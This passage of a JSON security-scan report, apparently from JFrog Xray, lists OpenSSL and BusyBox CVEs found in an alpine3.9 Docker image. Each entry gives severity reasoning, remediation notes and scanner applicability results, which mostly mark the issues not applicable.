`EVP_EncryptInit_ex2, or `EVP_DecryptInit_ex2` is called directly or indirectly with an `OSSL_PARAM` array that alters the `ivlen` and `keylen` parameters. Moreover, it only impacts the following ciphers: RC2, RC4, RC5, and the following cipher modes: CCM, GCM, OCB.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"Changing the key or IV lengths is not considered a popular operation. Furthermore, the API only affects OpenSSL 3.x and it is likely the app developers have discovered the problem during testing, as it would have caused the decryption to fail.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact\",\n                        \"description\": \"The given CVSS score does not take into account the unlikely prerequisites and the context required to exploit this CVE.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue results in a severe impact (such as remote code execution)\",\n                        \"description\": \"In the case that this vulnerability is exploited successfully, an attacker can read sensitive data as plaintext, breaking the encryption.\",\n                        \"is_positive\": false\n                    }\n                ]\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-5363\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if any of the following vulnerable functions are called:</p>\\n<ul>\\n<li><code>EVP_EncryptInit_ex2</code></li>\\n<li><code>EVP_DecryptInit_ex2</code></li>\\n<li><code>EVP_CipherInit_ex2</code></li>\\n</ul>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-5363\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if any of the following vulnerable functions are called:</p>\\n<ul>\\n<li><code>EVP_EncryptInit_ex2</code></li>\\n<li><code>EVP_DecryptInit_ex2</code></li>\\n<li><code>EVP_CipherInit_ex2</code></li>\\n</ul>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-5363\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-5363\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:busybox:1.29.3-r10\",\n                \"alpine://3.9:ssl_client:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190219\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190219&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `evaluate` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42385\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42385\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42385\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42385\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox 1.35-x's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the copyvar function.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:ssl_client:1.29.3-r10\",\n                \"alpine://3.9:busybox:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-211464\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-211464&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to denial of service and possibly code execution when processing a crafted awk pattern.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `copyvar` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven\",\n                        \"description\": \"Although a crashing PoC is available, no technical writeup has mentioned if the UaF can be exploited for code execution\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE (ex. through the `system` keyword), without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    }\n                ]\n            },\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"\",\n                    \"vulnerability_id\": \"CVE-2022-30065\",\n                    \"result\": \"not_covered\"\n                }\n            ]\n        },\n        {\n            \"description\": \"The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-200048\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-200048&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"Infinite loop in OpenSSL leads to denial of service when parsing a malformed certificate.\",\n                \"full_description\": \"A flaw was discovered in OpenSSL's `BN_mod_sqrt` function, when handling a non-prime modulus (`p`) - an incomplete loop condition can cause the function to loop indefinitely, causing a denial of service.\\n\\nIt is possible to create a malformed X.509 certificate, containing elliptic curve parameters that trigger this issue, when the certificate is parsed.\\nA malformed certificate may be parsed under various conditions - \\n1. TLS clients consuming server certificates - ex. a victim browser surfing to a malicious HTTPS website\\n2. TLS servers consuming client certificates - ex. a victim HTTPS server that accepts client certificates, attacked by a malicious HTTPS client (note that most web servers, including Apache and NGINX, do not accept client certificates by default)\\n\\nNote that unlike the original advisory suggests, all OpenSSL versions since 0.9.7 are vulnerable to this issue\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The issue has an exploit published\",\n                        \"description\": \"The exploit performs a local test and allows generating a malicious certificate for remote attacks\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue can be exploited by attackers over the network\",\n                        \"description\": \"In many cases, including the case of web servers that accept client certificates - unauthenticated remote attack is possible. Other cases are context-dependent.\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue has multiple mentions in general media\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue can be exploited by an unauthenticated attacker or an attacker with low privileges\",\n                        \"description\": \"X.509 certificates must be parsed before they can be validated, so an unauthenticated attack is highly likely\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The vulnerable service must somehow parse an X.509 certificate\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)\",\n                        \"description\": \"A vast amount of services parse X.509 certificates using OpenSSL\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Denial of service only. Since most web clients and servers employ multiprocessing, causing one process to get stuck in an infinite loop will not DoS the entire application. Furthermore - `openssl` is often run as a standalone (forked) process, which will have no effect if stuck in an infinite loop.\",\n                        \"is_positive\": true\n                    }\n                ]\n            },\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"\",\n                    \"vulnerability_id\": \"CVE-2022-0778\",\n                    \"result\": \"not_covered\"\n                }\n            ]\n        },\n        {\n            \"description\": \"The public API function BIO_new_NDEF is a helper function used for streaming\\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\\nend user applications.\\n\\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\\nBIO onto the front of it to form a BIO chain, and then returns the new head of\\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\\nrecipient public key is invalid, the new filter BIO is freed and the function\\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\\nis not properly cleaned up and the BIO passed by the caller still retains\\ninternal pointers to the previously freed filter BIO. If the caller then goes on\\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\\nlikely result in a crash.\\n\\n\\n\\nThis scenario occurs directly in the internal function B64_write_ASN1() which\\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\\nthe BIO. This internal function is in turn called by the public API functions\\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\\n\\nOther public API functions that may be impacted by this include\\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\\ni2d_PKCS7_bio_stream.\\n\\nThe OpenSSL cms and smime command line applications are similarly affected.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-608309\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-608309&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0215\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if at least one of the vulnerable functions is called:</p>\\n<pre><code>PEM_write_bio_ASN1_stream()\\nPEM_write_bio_CMS_stream()\\nPEM_write_bio_PKCS7_stream()\\nSMIME_write_ASN1()\\nSMIME_write_CMS()\\nSMIME_write_PKCS7()\\nBIO_new_CMS()\\nBIO_new_PKCS7()\\ni2d_CMS_bio_stream()\\ni2d_PKCS7_bio_stream()\\ni2d_ASN1_bio_stream()\\nBIO_new_NDEF()\\n</code></pre>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0215\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if at least one of the vulnerable functions is called:</p>\\n<pre><code>PEM_write_bio_ASN1_stream()\\nPEM_write_bio_CMS_stream()\\nPEM_write_bio_PKCS7_stream()\\nSMIME_write_ASN1()\\nSMIME_write_CMS()\\nSMIME_write_PKCS7()\\nBIO_new_CMS()\\nBIO_new_PKCS7()\\ni2d_CMS_bio_stream()\\ni2d_PKCS7_bio_stream()\\ni2d_ASN1_bio_stream()\\nBIO_new_NDEF()\\n</code></pre>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0215\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0215\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"The X509_V_FLAG_X509_STRICT flag enables additional security checks of the certificates present in a certificate chain. It is not set by default. Starting from OpenSSL version 1.1.1h a check to disallow certificates in the chain that have explicitly encoded elliptic curve parameters was added as an additional strict check. An error in the implementation of this check meant that the result of a previous check to confirm that certificates in the chain are valid CA certificates was overwritten. This effectively bypasses the check that non-CA certificates must not be able to issue other certificates. If a \\\"purpose\\\" has been configured then there is a subsequent opportunity for checks that the certificate is a valid CA. All of the named \\\"purpose\\\" values implemented in libcrypto perform this check. Therefore, where a purpose is set the certificate chain will still be rejected even when the strict flag has been used. A purpose is set by default in libssl client and server certificate verification routines, but it can be overridden or removed by an application. In order to be affected, an application must explicitly set the X509_V_FLAG_X509_STRICT verification flag and either not set a purpose for the certificate verification or, in the case of TLS client or server applications, override the default purpose. OpenSSL versions 1.1.1h and newer are affected by this issue. Users of these versions should upgrade to OpenSSL 1.1.1k. OpenSSL 1.0.2 is not impacted by this issue. Fixed in OpenSSL 1.1.1k (Affected 1.1.1h-1.1.1j).\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-159073\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-159073&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"\",\n                    \"vulnerability_id\": \"CVE-2021-3450\",\n                    \"result\": \"not_covered\"\n                }\n            ]\n        },\n        {\n            \"description\": \"In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the \\\"out\\\" parameter can be NULL and, on exit, the \\\"outlen\\\" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the \\\"out\\\" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. Fixed in OpenSSL 1.1.1l (Affected 1.1.1-1.1.1k).\",\n            \"severity\": \"Critical\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-183470\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-183470&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2021-3711\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether the vulnerable function <code>EVP_PKEY_decrypt</code> is called.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2021-3711\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether the vulnerable function <code>EVP_PKEY_decrypt</code> is called.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2021-3711\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2021-3711\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A security vulnerability has been identified in all supported versions\\n\\nof OpenSSL related to the verification of X.509 certificate chains\\nthat include policy constraints.  Attackers may be able to exploit this\\nvulnerability by creating a malicious certificate chain that triggers\\nexponential use of computational resources, leading to a denial-of-service\\n(DoS) attack on affected systems.\\n\\nPolicy processing is disabled by default but can be enabled by passing\\nthe `-policy' argument to the command line utilities or by calling the\\n`X509_VERIFY_PARAM_set1_policies()' function.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-428306\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-428306&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0464\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether OpenSSL supports the vulnerable policy constraints parsing functionality, by checking whether the <code>X509_VERIFY_PARAM_set1_policies</code> function is called (the functionality is disabled by default)</p>\\n<p>Note that the scanner does not check for an additional vulnerable case in which the vulnerable policy constraints parsing functionality is enabled via the command line flag <code>-policy</code>. For example, by running <code>openssl ca -policy match</code>. However - in this case, the vulnerability will lead to a DoS of a forked command-line utility, which has a minimal impact on security.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0464\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether OpenSSL supports the vulnerable policy constraints parsing functionality, by checking whether the <code>X509_VERIFY_PARAM_set1_policies</code> function is called (the functionality is disabled by default)</p>\\n<p>Note that the scanner does not check for an additional vulnerable case in which the vulnerable policy constraints parsing functionality is enabled via the command line flag <code>-policy</code>. For example, by running <code>openssl ca -policy match</code>. However - in this case, the vulnerability will lead to a DoS of a forked command-line utility, which has a minimal impact on security.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0464\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0464\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:ssl_client:1.29.3-r10\",\n                \"alpine://3.9:busybox:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190227\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190227&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded 